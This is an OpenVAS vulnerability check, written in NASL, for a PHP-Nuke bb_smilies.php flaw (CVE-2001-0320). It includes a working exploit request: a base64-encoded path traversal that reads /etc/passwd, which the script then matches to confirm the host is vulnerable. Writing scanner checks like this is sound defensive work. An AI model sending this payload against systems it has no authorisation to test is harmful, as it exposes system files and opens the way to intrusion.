# OpenVAS Vulnerability Test
# Description: PHP-Nuke security vulnerability (bb_smilies.php)
#
# Authors:
# SecuriTeam
# Updated: 2009/04/23
# Chandan S <schandan@secpod.com>
#
# Copyright:
# Copyright (C) 2001 SecuriTeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

CPE = "cpe:/a:phpnuke:php-nuke";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10630");
  script_version("2019-04-29T15:08:03+0000");
  script_tag(name:"last_modification", value:"2019-04-29 15:08:03 +0000 (Mon, 29 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2001-0320");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("PHP-Nuke security vulnerability (bb_smilies.php)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2001 SecuriTeam");
  script_dependencies("secpod_php_nuke_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("php-nuke/installed");

  script_xref(name:"URL", value:"http://www.securiteam.com/securitynews/5LP050A3QW.html");

  script_tag(name:"impact", value:"Every file that the webserver has access to can be read by anyone. It is
  also possible to change bb_smilies' administrator password and even execute
  arbitrary commands.");
  script_tag(name:"solution", value:"Upgrade to the latest version (Version 4.4.1 and above).");

  script_tag(name:"summary", value:"The remote host seems to be vulnerable to a security problem in PHP-Nuke (bb_smilies.php).
  The vulnerability is caused by inadequate processing of queries by PHP-Nuke's bb_smilies.php
  which results in returning the content of any file we desire (the file needs to be world-readable).
  A similar vulnerability in the same PHP program allows execution of arbitrary code by changing
  the password of the administrator of bb_smilies.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK";
data = http_get( item:url, port:port );
resultrecv = http_keepalive_send_recv( port:port, data:data );

if( egrep( pattern:".*root:.*:0:[01]:.*", string:resultrecv ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );